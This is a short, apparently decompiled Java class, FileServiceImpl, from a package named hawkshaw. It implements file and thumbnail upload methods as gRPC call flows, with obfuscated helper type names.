package com.hawkshaw.library.datalayer.network.service;

import a3.e;
import com.hawkshaw.library.datalayer.network.grpc.GrpcCallKt;
import w3.C1066b;

public final class FileServiceImpl implements FileService {
    public Object uploadFile(C1066b bVar, e eVar) {
        return GrpcCallKt.grpcCallFlow(new a(new FileServiceImpl$uploadFile$$inlined$map$1(bVar), (e) null));
    }

    public Object uploadThumbnails(C1066b bVar, e eVar) {
        return GrpcCallKt.grpcCallFlow(new b(new FileServiceImpl$uploadThumbnails$$inlined$map$1(bVar), (e) null));
    }
}
